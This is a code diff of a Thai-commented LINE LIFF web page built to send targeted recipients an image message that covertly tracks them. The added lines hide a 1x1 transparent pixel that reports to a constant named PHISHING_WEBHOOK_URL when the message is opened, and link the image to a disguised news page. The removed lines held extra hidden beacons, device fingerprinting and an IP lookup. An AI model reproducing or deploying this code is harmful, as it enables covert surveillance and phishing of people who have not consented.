@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw9YGzuW023Q2qM-h12MIS6wIS7XoSpHsFHwvL2ucZdH5C1ru2NADJgNOddcF3x30oL/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzOM1cjLUW8ZcTnJ_g9eXqZMmK0y4Wh3gH3Gcta4SyhLX0WJNbrB-1uqs63hgp0NbyD/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -818,39 +818,33 @@
                 if (!imageUrl) return;
                 
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
-                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; 
+                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง Random ID สำหรับ session
-                const randomId = Date.now() + Math.random().toString(36).substring(2, 10);
-                
-                // สร้าง URL การติดตามแบบ ZeroClick ที่มีประสิทธิภาพสูงขึ้น
-                const baseTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&sid=${randomId}`;
-                
-                // เทคนิคที่ 1: ใช้รูปภาพโปร่งใสเพื่อให้โหลดจาก webhook
-                const trackPixel1 = `${baseTrackUrl}&method=img1&r=${Math.random()}`;
-                
-                // เทคนิคที่ 2: ใช้อีกรูปภาพโปร่งใส (เผื่อรูปแรกไม่ทำงาน)
-                const trackPixel2 = `${baseTrackUrl}&method=img2&r=${Math.random()}`;
-                
-                // เทคนิคที่ 3: ใช้ iframe การโหลดเบื้องหลัง (fallback)
-                const iframeTracking = `${baseTrackUrl}&method=iframe&r=${Math.random()}`;
-                
-                // เตรียมข้อมูลพื้นฐานที่จะส่งไปกับ message
-                const metadata = `&browser=LINE&platform=${encodeURIComponent(navigator.platform)}&ua=${encodeURIComponent(navigator.userAgent.substring(0, 100))}`;
-                
-                // Flex message แบบปรับปรุงเพื่อให้ Zero Click ทำงานได้ในทุกแพลตฟอร์ม
+                // สร้าง URL สำหรับ Zero Click tracking - เฉพาะข้อมูลที่จำเป็นและ flag isTarget
+                // ไม่ใส่ข้อมูล device/browser/platform จากฝั่งผู้สร้างที่นี่
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
+                zeroClickTrackUrl += `&key=${trackingKey}`;
+                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
+                // เพิ่ม isTarget=true เพื่อให้ doGet รู้ว่านี่คือการโหลดจากฝั่งเป้าหมายจริงๆ
+                zeroClickTrackUrl += `&isTarget=true`;
+                // เพิ่ม random suffix เพื่อป้องกันการ cache ฝั่ง LINE client หรือ CDN
+                zeroClickTrackUrl += `&r=${Date.now()}${Math.random().toString(36).substring(2, 8)}`;
+
+                console.log("Zero Click Track URL:", zeroClickTrackUrl);
+
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่`, 
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
-                        hero: {
+                        hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
                             url: imageUrl,
                             size: 'full',
-                            aspectRatio: '1:1',
+                            aspectRatio: '1:1', // Keep aspect ratio consistent
                             aspectMode: 'cover',
-                            action: {
+                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
@@ -859,76 +853,57 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // เทคนิคที่ 1: ใช้รูปภาพโปร่งใส
+                                // ใส่รูปภาพขนาด 1x1 pixel ที่โปร่งใสเพื่อทำ zero click tracking
+                                // รูปนี้จะไม่ปรากฏในข้อความแต่จะโหลดเมื่อผู้รับเปิดข้อความ
                                 {
                                     type: 'image',
-                                    url: trackPixel1 + metadata,
-                                    size: '1px',
+                                    url: zeroClickTrackUrl, // ใช้ URL ที่สร้างใหม่
+                                    size: '1px', // ขนาดเล็กมาก
                                     aspectRatio: '1:1',
                                     aspectMode: 'cover',
-                                    position: 'absolute'
+                                    position: 'absolute', // วางแบบ absolute
+                                    offsetTop: '0px',     // ซ่อนไว้ที่มุมบนซ้าย
+                                    offsetStart: '0px'
                                 },
-                                // เทคนิคที่ 2: ใช้รูปภาพโปร่งใสอีกอัน (เผื่อตัวแรกไม่ทำงาน)
-                                {
-                                    type: 'image',
-                                    url: trackPixel2 + metadata,
-                                    size: '1px',
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover',
-                                    position: 'absolute',
-                                    offsetTop: '1px'
-                                },
-                                // เทคนิคที่ 3: ใช้ข้อความที่มี action
-                                {
-                                    type: 'text',
-                                    text: ' ',
-                                    size: 'xxs',
-                                    color: '#FFFFFF00',
-                                    align: 'center',
-                                    action: {
-                                        type: 'uri',
-                                        uri: iframeTracking + metadata
-                                    }
-                                },
-                                // ทำให้มี content ในกล่องเพื่อให้ body มีความสูง
+                                // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
                                 {
                                     type: 'box',
                                     layout: 'vertical',
                                     contents: [],
-                                    height: '1px',
+                                    height: '1px', // ทำให้ body กล่องเล็กมาก
                                     width: '1px'
                                 }
                             ],
-                            paddingAll: '0px',
-                            height: '1px'
-                        },
-                        styles: {
-                            hero: {
-                                separator: false
-                            },
-                            body: {
-                                separator: false,
-                                backgroundColor: '#FFFFFF00'
-                            }
+                            height: '1px', // ทำให้ body กล่องเล็กมาก
+                            paddingAll: '0px'
                         }
                     }
                 };
 
-                console.log("Attempting to share Flex Message with enhanced Zero Click tracking");
+                console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2));
 
-                // บันทึกข้อมูล Tracking Key ก่อนการแชร์
-                try {
-                    await saveTrackingCaseMapping(trackingKey, caseName);
-                } catch (saveError) {
-                    console.error('เกิดข้อผิดพลาดในการบันทึก Tracking Key:', saveError);
-                }
-
-                // แชร์ข้อความไปยังผู้รับ
                 if (liff.isApiAvailable('shareTargetPicker')) {
+                    console.log("ShareTargetPicker is available. Calling now...");
                     const result = await liff.shareTargetPicker([message]);
-                    
+                    console.log("ShareTargetPicker result:", result);
+
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
+                        
+                        // บันทึก Tracking Key Mapping ก่อน
+                        try {
+                            const saved = await saveTrackingCaseMapping(trackingKey, caseName);
+                            if (!saved) {
+                                console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
+                            } else {
+                                console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
+                            }
+                        } catch (saveError) {
+                            console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
+                            showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
+                        }
+
+                        // รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
                         showStatus('การแชร์ถูกยกเลิก', false);
@@ -977,136 +952,6 @@
         // ฟังก์ชันสร้าง ID เฉพาะ
         function generateUniqueId() {
             return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
-        }
-
-        // ฟังก์ชันดึงข้อมูลอุปกรณ์สำหรับส่งไปกับ ZeroClick
-        function getEnhancedDeviceInfo() {
-            const ua = navigator.userAgent;
-            let deviceInfo = {
-                platform: "ไม่ทราบ",
-                browser: "ไม่ทราบ", 
-                deviceType: "ไม่ทราบ",
-                deviceModel: "ไม่ทราบ",
-                screenSize: `${window.screen.width}x${window.screen.height}`,
-                pixelRatio: window.devicePixelRatio || 1,
-                orientation: screen.orientation ? screen.orientation.type : 'unknown',
-                connection: getConnectionInfo()
-            };
-            
-            // ระบบปฏิบัติการ (ละเอียดขึ้น)
-            if (/Windows NT 10\.0/.test(ua)) {
-                deviceInfo.platform = "Windows 10/11";
-            } else if (/Windows NT 6\.3/.test(ua)) {
-                deviceInfo.platform = "Windows 8.1";
-            } else if (/Windows NT 6\.2/.test(ua)) {
-                deviceInfo.platform = "Windows 8";
-            } else if (/Windows NT 6\.1/.test(ua)) {
-                deviceInfo.platform = "Windows 7";
-            } else if (/Windows NT 6\.0/.test(ua)) {
-                deviceInfo.platform = "Windows Vista";
-            } else if (/Windows NT 5\.1/.test(ua)) {
-                deviceInfo.platform = "Windows XP";
-            } else if (/Windows/.test(ua)) {
-                deviceInfo.platform = "Windows";
-            } else if (/Android ([0-9\.]+)/.test(ua)) {
-                deviceInfo.platform = "Android " + ua.match(/Android ([0-9\.]+)/)[1];
-            } else if (/iPhone|iPad|iPod/.test(ua)) {
-                const matches = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
-                const version = matches ? [matches[1], matches[2], matches[3] || 0].join('.') : "Unknown";
-                deviceInfo.platform = "iOS " + version;
-            } else if (/Mac OS X ([0-9_\.]+)/.test(ua)) {
-                const macVersion = ua.match(/Mac OS X ([0-9_\.]+)/)[1].replace(/_/g, '.');
-                deviceInfo.platform = "macOS " + macVersion;
-            } else if (/Linux/.test(ua)) {
-                deviceInfo.platform = "Linux";
-            } else if (/CrOS/.test(ua)) {
-                deviceInfo.platform = "Chrome OS";
-            }
-            
-            // ประเภทอุปกรณ์
-            if (/Mobile|Android/.test(ua) && !/iPad/.test(ua)) {
-                deviceInfo.deviceType = "มือถือ";
-            } else if (/iPad|Tablet/.test(ua)) {
-                deviceInfo.deviceType = "แท็บเล็ต";
-            } else {
-                deviceInfo.deviceType = "คอมพิวเตอร์";
-            }
-            
-            // เบราว์เซอร์ (ละเอียดขึ้น)
-            if (/Line/.test(ua)) {
-                deviceInfo.browser = "LINE " + (ua.match(/Line\/([0-9\.]+)/) ? ua.match(/Line\/([0-9\.]+)/)[1] : "");
-            } else if (/EdgA?\//.test(ua)) {
-                deviceInfo.browser = "Edge " + (ua.match(/EdgA?\/([0-9\.]+)/) ? ua.match(/EdgA?\/([0-9\.]+)/)[1] : "");
-            } else if (/Chrome\//.test(ua) && !/Chromium|Edge/.test(ua)) {
-                deviceInfo.browser = "Chrome " + (ua.match(/Chrome\/([0-9\.]+)/) ? ua.match(/Chrome\/([0-9\.]+)/)[1] : "");
-            } else if (/Firefox\//.test(ua)) {
-                deviceInfo.browser = "Firefox " + (ua.match(/Firefox\/([0-9\.]+)/) ? ua.match(/Firefox\/([0-9\.]+)/)[1] : "");
-            } else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) {
-                deviceInfo.browser = "Safari " + (ua.match(/Version\/([0-9\.]+)/) ? ua.match(/Version\/([0-9\.]+)/)[1] : "");
-            } else if (/MSIE|Trident/.test(ua)) {
-                deviceInfo.browser = "Internet Explorer " + (ua.match(/(?:MSIE |rv:)([0-9\.]+)/) ? ua.match(/(?:MSIE |rv:)([0-9\.]+)/)[1] : "");
-            }
-            
-            // รุ่นอุปกรณ์ (ละเอียดขึ้น)
-            if (/iPhone/.test(ua)) {
-                const matches = ua.match(/iPhone(?:\s+OS)?\s+([0-9_]+)/);
-                const versionStr = matches ? matches[1].replace(/_/g, '.') : "";
-                deviceInfo.deviceModel = `iPhone (iOS ${versionStr})`;
-            } else if (/iPad/.test(ua)) {
-                const matches = ua.match(/iPad(?:\s+OS)?\s+([0-9_]+)/);
-                const versionStr = matches ? matches[1].replace(/_/g, '.') : "";
-                deviceInfo.deviceModel = `iPad (iOS ${versionStr})`;
-            } else if (/Android/.test(ua)) {
-                // ดึงข้อมูล Android model
-                if (/samsung|SM-|Galaxy/i.test(ua)) {
-                    const model = ua.match(/SM-[A-Z0-9]+/i) || ua.match(/Galaxy\s[A-Z0-9\s]+/i);
-                    deviceInfo.deviceModel = model ? `Samsung ${model[0]}` : "Samsung Android";
-                } else if (/Pixel|Google/i.test(ua)) {
-                    const model = ua.match(/Pixel\s[0-9]+/i);
-                    deviceInfo.deviceModel = model ? `Google ${model[0]}` : "Google Pixel";
-                } else {
-                    const genericModel = ua.match(/Android.*?;\s([^;)]+)(?:\s+Build|\))/i);
-                    deviceInfo.deviceModel = genericModel ? genericModel[1].trim() : "Android Device";
-                }
-            }
-            
-            return deviceInfo;
-        }
-
-        // ฟังก์ชันดึงข้อมูลการเชื่อมต่อ
-        function getConnectionInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            
-            if (!connection) {
-                return {
-                    type: "unknown",
-                    effectiveType: "unknown",
-                    downlink: null,
-                    rtt: null
-                };
-            }
-            
-            return {
-                type: connection.type || "unknown",
-                effectiveType: connection.effectiveType || "unknown",
-                downlink: connection.downlink || null,
-                rtt: connection.rtt || null,
-                saveData: connection.saveData || false
-            };
-        }
-
-        // ฟังก์ชันดึงข้อมูล IP ผ่าน API (ทำงานแบบ best-effort)
-        async function getIPInfo() {
-            try {
-                const response = await fetch('https://ipinfo.io/json', { timeout: 2000 });
-                if (!response.ok) {
-                    throw new Error(`Failed to fetch IP info: ${response.status}`);
-                }
-                return await response.json();
-            } catch (error) {
-                console.warn("Could not fetch IP info:", error);
-                return null; // ล้มเหลวแต่ไม่ทำให้โปรแกรมหยุดทำงาน
-            }
         }
     </script>
 </body>
